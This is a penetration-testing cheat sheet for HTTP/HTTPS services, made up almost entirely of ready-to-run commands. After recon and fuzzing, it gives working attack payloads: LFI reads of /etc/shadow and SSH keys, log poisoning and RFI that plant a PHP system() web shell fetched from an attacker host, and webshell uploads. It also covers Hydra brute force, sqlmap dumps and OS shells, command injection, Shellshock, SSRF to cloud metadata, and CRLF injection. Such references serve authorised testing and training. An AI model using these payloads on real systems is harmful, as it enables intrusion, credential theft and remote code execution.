# HTTP/HTTPS ENUMERATION (Port 80/443/8080/8443)

## PORT OVERVIEW
```
Port 80   - HTTP (unencrypted)
Port 443  - HTTPS (TLS/SSL encrypted)
Port 8080 - HTTP Alternative (proxy, dev servers)
Port 8443 - HTTPS Alternative
Port 8000 - Common development port
Port 3000 - Node.js/React dev servers
Port 5000 - Flask/Python dev servers
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p80,443,8080,8443 <IP>                # Service/Version detection
curl -I http://<IP>                             # HEAD request (headers only)
curl -v http://<IP>                             # Verbose output
curl -k -I https://<IP>                         # HTTPS (ignore cert errors)
nc -nv <IP> 80                                  # Manual banner grab
telnet <IP> 80                                  # Alternative banner grab
openssl s_client -connect <IP>:443              # HTTPS banner + certificate info
```

## TECHNOLOGY FINGERPRINTING
```bash
# Automated fingerprinting
whatweb http://<IP>                             # Identify CMS, frameworks, servers
whatweb -v http://<IP>                          # Verbose mode
whatweb -a 3 http://<IP>                        # Aggression level 3 (more checks)
wappalyzer http://<IP>                          # Alternative tech detection
webtech -u http://<IP>                          # Web technology scanner

# Manual header analysis
curl -I http://<IP> | grep -i server            # Server header
curl -I http://<IP> | grep -i x-powered-by      # Technology header
curl -I http://<IP> | grep -i x-aspnet-version  # ASP.NET version

# Specific CMS detection
wpscan --url http://<IP> --enumerate vp         # WordPress scan
droopescan scan drupal -u http://<IP>           # Drupal scan
joomscan -u http://<IP>                         # Joomla scan
```

## NMAP WEB ENUMERATION SCRIPTS
```bash
nmap --script "http-*" -p80,443 <IP>            # All HTTP scripts
nmap --script=http-enum -p80 <IP>               # Enumerate directories
nmap --script=http-headers -p80 <IP>            # HTTP headers
nmap --script=http-title -p80 <IP>              # Page titles
nmap --script=http-methods -p80 <IP>            # Allowed HTTP methods
nmap --script=http-shellshock -p80 <IP>         # Shellshock vulnerability
nmap --script=http-vuln* -p80 <IP>              # Known HTTP vulnerabilities
nmap --script=http-backup-finder -p80 <IP>      # Find backup files
nmap --script=http-config-backup -p80 <IP>      # Config file backups
nmap --script=http-apache-negotiation -p80 <IP> # Apache content negotiation
nmap --script=http-robots.txt -p80 <IP>         # Parse robots.txt
nmap --script=http-git -p80 <IP>                # Find exposed .git directories
```

## DIRECTORY & FILE ENUMERATION
```bash
# Gobuster (fast, Go-based)
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<IP> -w wordlist.txt -x php,asp,aspx,txt,html,js,zip,bak
gobuster dir -u http://<IP> -w wordlist.txt -t 50 -k  # 50 threads, ignore SSL
gobuster dir -u http://<IP> -w wordlist.txt -s 200,204,301,302,307,401,403  # Status codes
gobuster dir -u http://<IP> -w wordlist.txt -b 404,400  # Blacklist status codes
gobuster dir -u http://<IP> -w wordlist.txt -a "User-Agent: Mozilla/5.0"  # Custom user-agent

# Feroxbuster (recursive, fast)
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://<IP> -w wordlist.txt -t 200 -d 3  # 200 threads, depth 3
feroxbuster -u http://<IP> -w wordlist.txt -x php,asp,aspx,txt,html
feroxbuster -u http://<IP> -w wordlist.txt --extract-links  # Extract links from pages

# Dirsearch (Python-based)
dirsearch -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
dirsearch -u http://<IP> -e php,asp,aspx,txt,html
dirsearch -u http://<IP> -e * -x 404,403        # All extensions, exclude 404/403
dirsearch -u http://<IP> -t 50 --random-agent   # 50 threads, random user-agent

# DIRB (classic)
dirb http://<IP> /usr/share/wordlists/dirb/common.txt
dirb http://<IP> /usr/share/wordlists/dirb/big.txt -X .php,.txt  # Extensions

# ffuf (fuzzer)
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<IP>/FUZZ -w wordlist.txt -mc 200,301,302,403  # Match status codes
ffuf -u http://<IP>/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.txt  # Extensions
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fc 404  # Filter 404s
ffuf -u http://<IP>/FUZZ -w wordlist.txt -fs 4242  # Filter by response size
```

## VHOST & SUBDOMAIN ENUMERATION
```bash
# VHost fuzzing (different content on same IP)
gobuster vhost -u http://<IP> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster vhost -u http://target.com -w wordlist.txt --append-domain  # Append base domain
ffuf -u http://<IP> -H "Host: FUZZ.target.com" -w wordlist.txt  # Host header fuzzing
ffuf -u http://<IP> -H "Host: FUZZ.target.com" -w wordlist.txt -fc 404

# Subdomain enumeration
sublist3r -d target.com                         # Passive + active enumeration
amass enum -d target.com                        # Comprehensive subdomain enum
subfinder -d target.com                         # Fast subdomain discovery
assetfinder --subs-only target.com              # Find subdomains
knockpy target.com                              # Subdomain scan
dnsrecon -d target.com -t brt -D wordlist.txt   # DNS bruteforce
```

## PARAMETER FUZZING
```bash
# Parameter discovery
ffuf -u http://<IP>/index.php?FUZZ=test -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
ffuf -u http://<IP>/page?FUZZ=1 -w params.txt -fw 100  # Filter by word count
wfuzz -u http://<IP>/index.php?FUZZ=test -w params.txt  # Alternative fuzzer
arjun -u http://<IP>/page.php                   # HTTP parameter discovery

# POST parameter fuzzing
ffuf -u http://<IP>/login -X POST -d "FUZZ=test" -w params.txt -H "Content-Type: application/x-www-form-urlencoded"
wfuzz -u http://<IP>/login -X POST -d "FUZZ=test" -w params.txt

# Value fuzzing
ffuf -u http://<IP>/page?id=FUZZ -w numbers.txt  # ID parameter fuzzing
wfuzz -u http://<IP>/page?file=FUZZ -w lfi-wordlist.txt  # LFI fuzzing
```

## API ENUMERATION
```bash
# API endpoint discovery
gobuster dir -u http://<IP> -w /usr/share/wordlists/api-endpoints.txt -p pattern.txt
# pattern.txt contains: {GOBUSTER}/v1, {GOBUSTER}/v2, {GOBUSTER}/api

# Common API patterns to test
curl http://<IP>/api/v1/users                   # RESTful API
curl http://<IP>/api/v2/admin                   # Version 2
curl -X GET http://<IP>/graphql                 # GraphQL endpoint
curl -X POST http://<IP>/api/login -H "Content-Type: application/json" -d '{"user":"admin","pass":"admin"}'

# API documentation discovery
curl http://<IP>/api/docs                       # Swagger/OpenAPI docs
curl http://<IP>/swagger.json                   # Swagger JSON
curl http://<IP>/api-docs                       # API documentation
curl http://<IP>/graphql                        # GraphQL playground

# API authentication testing
curl -X POST http://<IP>/api/v1/login -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}'
curl -H "Authorization: Bearer <token>" http://<IP>/api/v1/users  # JWT auth
curl -H "X-API-Key: <key>" http://<IP>/api/data  # API key auth
```

## COMMON FILES & DIRECTORIES
```bash
# Important files to check
curl http://<IP>/robots.txt                     # Robots exclusion
curl http://<IP>/sitemap.xml                    # Site structure
curl http://<IP>/.git/HEAD                      # Exposed Git repo
curl http://<IP>/.svn/entries                   # Exposed SVN repo
curl http://<IP>/.env                           # Environment variables
curl http://<IP>/web.config                     # IIS configuration
curl http://<IP>/.htaccess                      # Apache config
curl http://<IP>/phpinfo.php                    # PHP info page
curl http://<IP>/server-status                  # Apache server status
curl http://<IP>/admin                          # Admin panel
curl http://<IP>/login                          # Login page
curl http://<IP>/backup.zip                     # Backup files
curl http://<IP>/config.php.bak                 # Backup configs

# Wordlists for common files
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
```

## SSL/TLS ENUMERATION
```bash
# SSL certificate analysis
openssl s_client -connect <IP>:443              # Get certificate + server info
openssl s_client -connect <IP>:443 -showcerts   # Show full certificate chain
openssl s_client -connect <IP>:443 < /dev/null 2>&1 | openssl x509 -noout -text  # Parse cert

# SSL/TLS vulnerability scanning
sslscan <IP>:443                                # Quick SSL scan
sslscan --show-certificate <IP>:443             # Show certificate details
testssl.sh <IP>:443                             # Comprehensive TLS testing
nmap --script ssl-enum-ciphers -p443 <IP>       # Enumerate SSL ciphers
nmap --script ssl-heartbleed -p443 <IP>         # Heartbleed check
nmap --script ssl-poodle -p443 <IP>             # POODLE vulnerability
nmap --script ssl-cert -p443 <IP>               # Certificate info

# Check for specific vulnerabilities
testssl.sh --heartbleed <IP>:443                # Heartbleed
testssl.sh --poodle <IP>:443                    # POODLE
testssl.sh --beast <IP>:443                     # BEAST
testssl.sh --crime <IP>:443                     # CRIME
```

## VULNERABILITY SCANNING
```bash
# Nikto (web server scanner)
nikto -h http://<IP>                            # Basic scan
nikto -h http://<IP> -Tuning 1,2,3,4            # Tuning options (1=interesting, 2=misconfiguration, etc.)
nikto -h http://<IP> -output nikto_report.html -Format html  # HTML report

# Nuclei (template-based scanner)
nuclei -u http://<IP>                           # Scan with all templates
nuclei -u http://<IP> -t /root/nuclei-templates/cves/  # CVE templates only
nuclei -u http://<IP> -t /root/nuclei-templates/vulnerabilities/  # Vulnerability templates
nuclei -l urls.txt -t /root/nuclei-templates/   # Scan multiple targets

# Nmap vulnerability scripts
nmap --script vuln -p80,443 <IP>                # All vuln scripts
nmap --script http-vuln* -p80 <IP>              # HTTP-specific vulns

# Specific vulnerability checks
nmap --script http-shellshock -p80 <IP>         # Shellshock (CVE-2014-6271)
nmap --script http-slowloris-check -p80 <IP>    # Slowloris DoS
```

## WORDPRESS ENUMERATION
```bash
# WPScan
wpscan --url http://<IP>                        # Basic scan
wpscan --url http://<IP> --enumerate u          # Enumerate users
wpscan --url http://<IP> --enumerate p          # Enumerate plugins
wpscan --url http://<IP> --enumerate t          # Enumerate themes
wpscan --url http://<IP> --enumerate vp,vt      # Vulnerable plugins/themes
wpscan --url http://<IP> --enumerate ap,at,u    # All plugins, themes, users
wpscan --url http://<IP> --passwords rockyou.txt --usernames admin  # Brute force

# Manual WordPress enumeration
curl http://<IP>/wp-json/wp/v2/users            # WordPress REST API users
curl http://<IP>/wp-login.php                   # Login page
curl http://<IP>/wp-admin/                      # Admin panel
curl http://<IP>/xmlrpc.php                     # XML-RPC (brute force vector)
curl http://<IP>/readme.html                    # WordPress version

# WordPress user enumeration
wpscan --url http://<IP> -e u1-100              # Enumerate users 1-100
curl http://<IP>/?author=1                      # Author ID enumeration
```

## CMS-SPECIFIC ENUMERATION
```bash
# Joomla
joomscan -u http://<IP>                         # Joomla scanner
joomscan -u http://<IP> --enumerate-components  # Enumerate components

# Drupal
droopescan scan drupal -u http://<IP>           # Drupal scanner
droopescan scan drupal -u http://<IP> -t 8      # Drupal 8

# Magento
magescan scan:all http://<IP>                   # Magento scanner

# SharePoint
sparty -s http://<IP>                           # SharePoint scanner
```

## WEB APPLICATION FIREWALL (WAF) DETECTION
```bash
# WAF detection
wafw00f http://<IP>                             # Detect WAF
nmap --script http-waf-detect -p80 <IP>         # Nmap WAF detection
nmap --script http-waf-fingerprint -p80 <IP>    # WAF fingerprinting

# Manual WAF detection
curl -I http://<IP> | grep -i cloudflare        # Cloudflare
curl -I http://<IP> | grep -i akamai            # Akamai
curl -I http://<IP> | grep -i x-sucuri          # Sucuri
```

## AUTHENTICATION BRUTE FORCE
```bash
# Hydra HTTP form brute force
hydra -l admin -P rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -t 10
hydra -L users.txt -P passwords.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" -V
hydra -l admin -P passwords.txt <IP> http-get /admin  # HTTP Basic Auth

# Medusa
medusa -h <IP> -u admin -P passwords.txt -M http -m DIR:/admin -T 10

# Burp Suite Intruder (manual)
# Capture login request → Send to Intruder → Set payload positions → Attack

# ffuf login brute force
ffuf -u http://<IP>/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt -H "Content-Type: application/x-www-form-urlencoded" -fc 200
```

## WEB SHELLS & BACKDOORS
```bash
# Common webshell locations
curl http://<IP>/shell.php
curl http://<IP>/cmd.php
curl http://<IP>/uploads/shell.php
curl http://<IP>/images/shell.php.jpg           # Double extension

# Test for webshell
curl http://<IP>/shell.php?cmd=whoami           # Simple command execution
curl http://<IP>/shell.php -d "cmd=whoami"      # POST method

# Webshell upload testing (if upload exists)
curl -F "file=@shell.php" http://<IP>/upload.php
```

## LOCAL FILE INCLUSION (LFI) TESTING
```bash
# Basic LFI
curl http://<IP>/page.php?file=/etc/passwd
curl http://<IP>/page.php?file=../../../../etc/passwd
curl http://<IP>/page.php?file=....//....//....//etc/passwd  # Bypass filters

# LFI with null byte (PHP < 5.3)
curl http://<IP>/page.php?file=../../../../etc/passwd%00

# LFI to RCE via log poisoning
curl http://<IP>/page.php?file=/var/log/apache2/access.log
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/  # Poison log
curl http://<IP>/page.php?file=/var/log/apache2/access.log&cmd=whoami  # Execute

# Common LFI files (Linux)
/etc/passwd, /etc/shadow, /etc/hosts, /etc/hostname, /etc/issue
/var/log/apache2/access.log, /var/log/apache2/error.log
/proc/self/environ, /proc/self/cmdline
/home/user/.ssh/id_rsa, /root/.ssh/id_rsa

# Common LFI files (Windows)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

## REMOTE FILE INCLUSION (RFI) TESTING
```bash
# Basic RFI (if allow_url_include=On)
curl http://<IP>/page.php?file=http://attacker.com/shell.txt

# Host malicious file
echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
python3 -m http.server 80
curl http://<IP>/page.php?file=http://<attacker_IP>/shell.txt&cmd=whoami
```

## SQL INJECTION TESTING
```bash
# Manual SQLi testing
curl "http://<IP>/page.php?id=1'"               # Error-based SQLi
curl "http://<IP>/page.php?id=1 OR 1=1--"       # Boolean-based SQLi
curl "http://<IP>/page.php?id=1 UNION SELECT NULL--"  # Union-based SQLi
curl "http://<IP>/page.php?id=1; WAITFOR DELAY '00:00:05'--"  # Time-based SQLi

# SQLMap (automated)
sqlmap -u "http://<IP>/page.php?id=1"           # Basic scan
sqlmap -u "http://<IP>/page.php?id=1" --dbs     # Enumerate databases
sqlmap -u "http://<IP>/page.php?id=1" -D dbname --tables  # Enumerate tables
sqlmap -u "http://<IP>/page.php?id=1" -D dbname -T users --dump  # Dump table
sqlmap -u "http://<IP>/page.php?id=1" --os-shell  # OS shell via SQLi
sqlmap -r request.txt --batch --dbs             # From request file

# SQLi in POST requests
sqlmap -u "http://<IP>/login" --data "user=admin&pass=admin" -p user  # Test 'user' param
```

## CROSS-SITE SCRIPTING (XSS) TESTING
```bash
# Manual XSS testing
curl "http://<IP>/search?q=<script>alert(1)</script>"
curl "http://<IP>/page?name=<img src=x onerror=alert(1)>"
curl "http://<IP>/comment?text=<svg/onload=alert(1)>"

# XSStrike (automated)
xsstrike -u "http://<IP>/search?q=test"         # Scan for XSS
xsstrike -u "http://<IP>/search?q=test" --crawl # Crawl and scan

# Dalfox (fast XSS scanner)
dalfox url http://<IP>/page?q=test
dalfox file urls.txt                            # Scan multiple URLs
```

## COMMAND INJECTION TESTING
```bash
# Basic command injection
curl "http://<IP>/ping.php?ip=127.0.0.1;whoami"
curl "http://<IP>/ping.php?ip=127.0.0.1|whoami"
curl "http://<IP>/ping.php?ip=127.0.0.1%26whoami"  # URL encoded &
curl "http://<IP>/ping.php?ip=127.0.0.1`whoami`"   # Backticks
curl "http://<IP>/ping.php?ip=$(whoami)"        # Command substitution

# Blind command injection (time-based)
curl "http://<IP>/ping.php?ip=127.0.0.1;sleep 5"
curl "http://<IP>/ping.php?ip=127.0.0.1||ping -c 5 127.0.0.1"

# Commix (automated)
commix -u "http://<IP>/ping.php?ip=127.0.0.1"
```

## PATH TRAVERSAL TESTING
```bash
# Basic path traversal
curl http://<IP>/download?file=../../../../etc/passwd
curl http://<IP>/download?file=....//....//....//etc/passwd
curl http://<IP>/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd  # URL encoded

# Windows path traversal
curl http://<IP>/download?file=../../../../windows/win.ini
curl http://<IP>/download?file=..\..\..\..\windows\win.ini
```

## SERVER-SIDE REQUEST FORGERY (SSRF) TESTING
```bash
# Basic SSRF
curl "http://<IP>/proxy?url=http://127.0.0.1"   # Access localhost
curl "http://<IP>/proxy?url=http://127.0.0.1:22"  # Port scan via SSRF
curl "http://<IP>/proxy?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata
curl "http://<IP>/proxy?url=file:///etc/passwd"  # File access via SSRF

# SSRF to internal network
curl "http://<IP>/proxy?url=http://192.168.1.1"
curl "http://<IP>/proxy?url=http://internal-server/"
```

## SHELLSHOCK TESTING (CVE-2014-6271)
```bash
# Shellshock via User-Agent
curl -A "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'" http://<IP>/cgi-bin/test.sh

# Shellshock via referer
curl -H "Referer: () { :; }; echo; /bin/bash -c 'whoami'" http://<IP>/cgi-bin/test.sh

# Nmap Shellshock detection
nmap --script http-shellshock --script-args uri=/cgi-bin/test.sh -p80 <IP>
```

## INTERESTING HTTP HEADERS
```bash
# Security headers to check
curl -I http://<IP> | grep -i "strict-transport-security"  # HSTS
curl -I http://<IP> | grep -i "x-frame-options"     # Clickjacking protection
curl -I http://<IP> | grep -i "x-content-type-options"  # MIME sniffing
curl -I http://<IP> | grep -i "x-xss-protection"    # XSS filter
curl -I http://<IP> | grep -i "content-security-policy"  # CSP

# Information disclosure headers
curl -I http://<IP> | grep -i "server"          # Server version
curl -I http://<IP> | grep -i "x-powered-by"    # Technology stack
curl -I http://<IP> | grep -i "x-aspnet-version"  # ASP.NET version
curl -I http://<IP> | grep -i "x-debug"         # Debug headers
```

## HTTP METHODS TESTING
```bash
# Test allowed methods
curl -X OPTIONS http://<IP> -v                  # OPTIONS method
nmap --script http-methods -p80 <IP>            # Nmap method enumeration

# Test dangerous methods
curl -X PUT http://<IP>/shell.php --data-binary @shell.php  # PUT upload
curl -X DELETE http://<IP>/file.txt            # DELETE method
curl -X TRACE http://<IP>                       # TRACE (XST attack)
```

## CONTENT DISCOVERY
```bash
# Backup file discovery
curl http://<IP>/index.php.bak
curl http://<IP>/index.php.old
curl http://<IP>/index.php~
curl http://<IP>/.index.php.swp                 # Vim swap file
curl http://<IP>/config.php.bak

# Source code disclosure
curl http://<IP>/index.php.txt
curl http://<IP>/index.phps                     # PHP source (if misconfigured)

# Git repository enumeration
curl http://<IP>/.git/config
git-dumper http://<IP>/.git/ ./git-dump         # Dump entire .git
```

## SCREENSHOT & VISUAL RECON
```bash
# Automated screenshot
eyewitness --web -f urls.txt                    # Screenshot multiple URLs
gowitness file -f urls.txt                      # Alternative screenshot tool
cutycapt --url=http://<IP> --out=screenshot.png # Single screenshot

# Aquatone (subdomain + screenshot)
cat subdomains.txt | aquatone                   # Screenshot all subdomains
```

## PROXY & INTERCEPTION
```bash
# Burp Suite
# Configure browser to use 127.0.0.1:8080 → Intercept requests

# ZAP (OWASP Zed Attack Proxy)
zap.sh -daemon -port 8080                       # Start ZAP in daemon mode
zap-cli quick-scan http://<IP>                  # Quick scan

# mitmproxy
mitmproxy -p 8080                               # Interactive proxy
mitmdump -w traffic.log                         # Dump traffic to file
```

## QUICK WIN CHECKLIST
```
☐ Check robots.txt, sitemap.xml
☐ Test for default credentials (admin/admin, admin/password)
☐ Enumerate directories (gobuster, feroxbuster)
☐ Check for .git, .svn, .env exposure
☐ Test for SQLi (sqlmap)
☐ Test for XSS (manual, xsstrike)
☐ Test for LFI/RFI (file parameters)
☐ Check for command injection
☐ Enumerate users (WordPress, API, etc.)
☐ Test for file upload vulnerabilities
☐ Check SSL/TLS configuration (testssl.sh)
☐ Look for backup files (.bak, .old, ~)
☐ Test HTTP methods (PUT, DELETE, TRACE)
☐ Check for Shellshock (CGI scripts)
☐ Analyze security headers
☐ Look for information disclosure in comments/source
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick web enumeration
nmap -sV -p80,443 --script http-enum,http-headers,http-methods,http-title <IP> && \
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html && \
nikto -h http://<IP>

# Comprehensive scan
whatweb -v http://<IP> && \
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,txt,html && \
nuclei -u http://<IP> -t /root/nuclei-templates/
```

## ADVANCED TECHNIQUES
```bash
# HTTP Request Smuggling
# Test for CL.TE, TE.CL, TE.TE desync vulnerabilities

# Cache Poisoning
curl -H "X-Forwarded-Host: evil.com" http://<IP>/

# Host Header Injection
curl -H "Host: evil.com" http://<IP>/

# CRLF Injection
curl "http://<IP>/redirect?url=https://google.com%0d%0aSet-Cookie:%20admin=true"

# HTTP Parameter Pollution
curl "http://<IP>/page?id=1&id=2"

# Race Conditions
# Send multiple requests simultaneously to test for race conditions
```
